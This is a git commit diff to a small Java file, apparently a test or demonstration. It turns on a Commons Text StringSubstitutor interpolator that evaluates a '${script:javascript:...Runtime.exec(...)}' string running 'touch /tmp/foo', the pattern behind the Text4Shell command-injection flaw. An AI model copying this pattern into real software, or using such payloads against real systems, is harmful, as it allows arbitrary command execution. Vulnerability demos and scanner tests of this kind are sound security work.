7ab54f4e4760457f44e04a12fbbf565066ae76d5
Gabriel Vazquez <gabrielv@sonatype.com>
2024-08-26 17:24:57 -0300

    test

--- src/main/java/MyApp.java
+++ src/main/java/MyApp.java
@@ -1,16 +1,16 @@
-import java.util.logging.Logger;
+// import java.util.logging.Logger;
 
-// import org.apache.commons.text.StringSubstitutor;
+import org.apache.commons.text.StringSubstitutor;
 
 public class MyApp {
 
-    static Logger logger = Logger.getLogger(MyApp.class.getName());
+    // static Logger logger = Logger.getLogger(MyApp.class.getName());
     public static void main(String[] args) {
         System.out.println("Hello, World!");
-        logger.info("Hello, World!");
+        // logger.info("Hello, World!");
 
-        // final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
-        // String out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}");
-        // System.out.println(out);
+        final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
+        String out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}");
+        System.out.println(out);
     }
 }
